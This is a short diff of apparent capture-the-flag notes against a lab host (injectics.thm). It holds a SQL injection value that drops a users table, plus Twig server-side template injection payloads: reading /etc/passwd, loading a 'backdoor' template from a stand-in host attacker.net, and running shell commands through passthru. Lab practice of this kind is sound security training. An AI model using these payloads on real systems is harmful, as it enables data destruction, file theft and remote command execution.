@@ -163,7 +163,15 @@ rank=2&country=&gold=7; drop table users -- -&silver=0&bronze=7
 
 
 
+Found that first name item in http://injectics.thm/update_profile.php is SSTI vulneable with twig/twig	"2.14.0"
 
+{{7*'7'}}
+{{dump(app)}}
+{{app.request.server.all|join(',')}}
+"{{'/etc/passwd'|file_excerpt(1,30)}}"@
+{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
+{{['id',""]|sort('passthru')}}
+{{['ls -la ./flags',""]|sort('passthru')}}
 
   
 <\code>
